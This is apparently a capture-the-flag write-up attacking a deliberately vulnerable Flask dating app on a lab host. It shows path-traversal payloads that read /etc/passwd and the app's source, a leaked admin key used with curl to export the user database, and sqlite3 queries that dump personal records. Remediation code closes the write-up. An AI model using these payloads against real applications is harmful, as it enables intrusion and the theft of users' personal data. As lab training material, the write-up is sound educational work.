# Valenfind Dating App - Security Assessment

**Author:** Sithum Shihara - ZAARA  
**Date:** February 14, 2026  
**Challenge:** Valenfind Dating Application Exploitation  
**Difficulty:** Medium  

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Reconnaissance](#reconnaissance)
3. [Vulnerability Discovery](#vulnerability-discovery)
4. [Exploitation](#exploitation)
5. [Post-Exploitation](#post-exploitation)
6. [Remediation Recommendations](#remediation-recommendations)
7. [Conclusion](#conclusion)

---

## Executive Summary

This writeup documents the security assessment of the Valenfind dating application, a web-based platform that was found to contain multiple critical vulnerabilities. Through systematic analysis and exploitation, complete access to the application's source code and database was achieved, resulting in the exposure of sensitive user information and administrative credentials.

**Key Findings:**
- Local File Inclusion (LFI) vulnerability in the theme selection mechanism
- Hardcoded administrative API credentials in source code
- Unrestricted database export functionality
- Insufficient input validation and sanitization

---

## Reconnaissance

### Initial Access

The application was accessible at:
```
http://10.65.182.35:5000
```

### Application Mapping

Initial exploration revealed the following structure:

**Public Endpoints:**
- `/` - Landing page with login/signup options
- `/login` - User authentication
- `/register` - New user registration
- `/dashboard` - User discovery interface
- `/profile/<username>` - Public user profiles

**Authenticated Endpoints:**
- `/my_profile` - Current user's profile management
- `/settings` - User settings and preferences
- `/complete_profile` - Profile information completion

### Technology Stack Identification

Through initial reconnaissance, the following technologies were identified:
- **Backend Framework:** Flask (Python)
- **Database:** SQLite3
- **Template Engine:** Jinja2
- **Session Management:** Flask sessions with server-side secret key

---

## Vulnerability Discovery

### 1. Theme Selection Analysis

During profile exploration, a theme selection feature was discovered that allowed users to customize their profile appearance. The dropdown menu contained the following options:

```html
<select id="theme-selector">
  <option value="theme_classic.html">Classic Romance</option>
  <option value="theme_modern.html">Modern Dark</option>
  <option value="theme_romance.html">Cupid's Choice</option>
</select>
```

**Critical Observation:** The theme values were actual filenames rather than abstract identifiers, suggesting potential file inclusion vulnerabilities.

### 2. API Endpoint Discovery

Network traffic analysis revealed an AJAX endpoint responsible for theme loading:

```
GET /api/fetch_layout?layout=theme_classic.html
```

This endpoint appeared to directly serve file contents based on the `layout` parameter, indicating a potential Local File Inclusion (LFI) vulnerability.

---

## Exploitation

### Phase 1: Local File Inclusion (LFI)

#### Test 1: System File Access

To verify the LFI vulnerability, a path traversal payload was injected:

```javascript
const selector = document.getElementById('theme-selector');
const option = document.createElement('option');
option.value = '../../../../etc/passwd';
option.text = 'LFI Test';
selector.appendChild(option);
selector.value = '../../../../etc/passwd';
selector.dispatchEvent(new Event('change'));
```

**Result:** Successfully retrieved the contents of `/etc/passwd`, confirming the LFI vulnerability.

**Sample Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

#### Test 2: Application Source Code Retrieval

Based on the error message revealing the application path (`/opt/Valenfind/templates/components/`), the following payload was constructed:

```javascript
const selector = document.getElementById('theme-selector');
const option = document.createElement('option');
option.value = '../../app.py';
option.text = 'LFI app.py';
selector.appendChild(option);
selector.value = '../../app.py';
selector.dispatchEvent(new Event('change'));
```

**Result:** Successfully retrieved the complete application source code.

### Phase 2: Source Code Analysis

The retrieved `app.py` file revealed several critical security issues:

#### Finding 1: Hardcoded Administrative Credentials

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'
```

#### Finding 2: Vulnerable File Inclusion Code

```python
@app.route('/api/fetch_layout')
def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')
    
    if 'cupid.db' in layout_file or 'seeder.py' in layout_file:
        return "Security Alert: Database file access is strictly prohibited."
    
    base_dir = os.path.join(os.getcwd(), 'templates', 'components')
    file_path = os.path.join(base_dir, layout_file)
    
    with open(file_path, 'r') as f:
        return f.read()
```

**Vulnerability Analysis:**
- Direct file path construction using user input
- Insufficient path validation (only checks for specific strings)
- No path normalization or canonicalization
- Allows directory traversal via `../` sequences

#### Finding 3: Administrative Database Export Endpoint

```python
@app.route('/api/admin/export_db')
def export_db():
    api_key = request.headers.get('X-Valentine-Token')
    if api_key != ADMIN_API_KEY:
        return "Unauthorized", 403
    
    return send_file(DATABASE, as_attachment=True)
```

### Phase 3: Database Exfiltration

Using the discovered administrative API key, the database was exported:

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     http://10.65.182.35:5000/api/admin/export_db \
     -o cupid.db
```

**Response:**
```
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                               Dload  Upload   Total   Spent    Left  Speed
100 16384  100 16384    0     0  17100      0 --:--:-- --:--:-- --:--:-- 17084
```

---

## Post-Exploitation

### Database Analysis

The exported SQLite database was analyzed using the following commands:

```bash
# List tables
sqlite3 cupid.db ".tables"
```

**Output:**
```
users
```

```bash
# Examine table schema
sqlite3 cupid.db ".schema users"
```

**Schema:**
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    real_name TEXT,
    email TEXT,
    phone_number TEXT,
    address TEXT,
    bio TEXT,
    likes INTEGER DEFAULT 0,
    avatar_image TEXT
);
```

### Data Extraction

```bash
# Query all user records
sqlite3 cupid.db "SELECT * FROM users"
```

**Sample Records (Sanitized):**

| ID | Username | Real Name | Email | Phone | Address | Bio |
|----|----------|-----------|-------|-------|---------|-----|
| 1 | romeo_montague | Romeo Montague | romeo@verona.cupid | 555-0100-ROMEO | 123 Balcony Way, Verona | Looking for my Juliet |
| 2 | casanova_official | Giacomo Casanova | loverboy@venice.kiss | 555-0155-LOVE | 101 Grand Canal St, Venice | Just here for the free chocolate |
| 8 | cupid | System Administrator | cupid@internal.cupid | 555-0000-ROOT | FLAG: THM{*************************************} | I keep the database secure |

### Flag Retrieval

The flag was located in the `address` field of the administrative user account (username: `cupid`):

```
FLAG: THM{*************************************}
```

---

## Remediation Recommendations

### Critical Priority

1. **Fix Local File Inclusion Vulnerability**
   - Implement a whitelist of allowed theme files
   - Use indirect object references (IDs) instead of filenames
   - Validate and sanitize all user input
   - Implement path canonicalization and validation

   **Recommended Code:**
   ```python
   ALLOWED_THEMES = {
       'classic': 'theme_classic.html',
       'modern': 'theme_modern.html',
       'romance': 'theme_romance.html'
   }
   
   @app.route('/api/fetch_layout')
   def fetch_layout():
       theme_id = request.args.get('layout', 'classic')
       
       if theme_id not in ALLOWED_THEMES:
           return "Invalid theme", 400
       
       layout_file = ALLOWED_THEMES[theme_id]
       base_dir = os.path.join(os.getcwd(), 'templates', 'components')
       file_path = os.path.join(base_dir, layout_file)
       
       # Verify the resolved path is within the allowed directory
       if not os.path.abspath(file_path).startswith(os.path.abspath(base_dir)):
           return "Access denied", 403
       
       with open(file_path, 'r') as f:
           return f.read()
   ```

2. **Remove Hardcoded Credentials**
   - Store sensitive credentials in environment variables
   - Use a secure configuration management system
   - Implement proper secrets management

   **Recommended Approach:**
   ```python
   import os
   from dotenv import load_dotenv
   
   load_dotenv()
   ADMIN_API_KEY = os.getenv('ADMIN_API_KEY')
   ```

3. **Secure Administrative Endpoints**
   - Implement proper authentication and authorization
   - Use strong, randomly generated API keys
   - Implement rate limiting
   - Add audit logging for administrative actions

### High Priority

4. **Password Security**
   - Hash passwords using bcrypt or Argon2
   - Never store plaintext passwords
   - Implement password complexity requirements

5. **Input Validation**
   - Validate all user inputs on the server side
   - Implement proper data sanitization
   - Use parameterized queries for database operations

6. **Security Headers**
   - Implement Content Security Policy (CSP)
   - Add X-Frame-Options header
   - Enable HSTS (HTTP Strict Transport Security)

### Medium Priority

7. **Session Management**
   - Use cryptographically secure session tokens
   - Implement session timeout
   - Regenerate session IDs after authentication

8. **Error Handling**
   - Implement generic error messages for users
   - Log detailed errors server-side only
   - Avoid exposing system paths in error messages

---

## Conclusion

The Valenfind dating application contained multiple critical vulnerabilities that allowed for complete compromise of the system. The primary attack vector was a Local File Inclusion vulnerability in the theme selection mechanism, which enabled source code disclosure and revealed hardcoded administrative credentials. These credentials were then used to export the entire user database, exposing sensitive personal information.

This assessment demonstrates the importance of:
- Secure coding practices and input validation
- Proper secrets management
- Regular security audits and code reviews
- Defense-in-depth security architecture

The identified vulnerabilities should be addressed immediately to prevent unauthorized access and data breaches.

---

## Timeline

| Time | Action |
|------|--------|
| 11:39 | Initial reconnaissance and application mapping |
| 11:45 | Discovery of theme selection mechanism |
| 11:50 | LFI vulnerability confirmed with `/etc/passwd` |
| 11:52 | Application source code retrieved via LFI |
| 11:55 | Administrative API key discovered in source code |
| 12:00 | Database successfully exported using admin credentials |
| 12:02 | Flag retrieved from database |

---

## Tools Used

- **Web Browser:** Chrome/Firefox with Developer Tools
- **Command Line:** curl, sqlite3
- **Programming:** JavaScript (for payload injection)
- **Analysis:** Manual code review

---

## References

- OWASP Top 10 - A03:2021 Injection
- OWASP Testing Guide - Testing for Local File Inclusion
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-798: Use of Hard-coded Credentials

---

**Disclaimer:** This writeup is for educational purposes only. All testing was performed in a controlled environment with proper authorization.
